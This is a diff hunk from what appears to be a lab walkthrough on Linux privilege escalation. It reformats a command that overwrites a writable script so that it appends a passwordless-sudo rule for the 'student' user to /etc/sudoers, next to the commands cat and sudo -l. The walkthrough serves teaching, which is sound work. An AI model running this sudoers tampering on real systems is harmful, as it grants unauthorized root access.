@@ -98,7 +98,8 @@ Gives us Exploits and OS information. We download the exploit from the website. 
   `cat /usr/local/share/copy.sh`
   Displays the content of the copy.sh script.
 
-  `printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh`
+  `printf '#! /bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' >
+/usr/local/share/copy.sh`
   Creates or modifies the copy.sh script to add a command that gives the "student" user root privileges.
 
   `sudo -l`
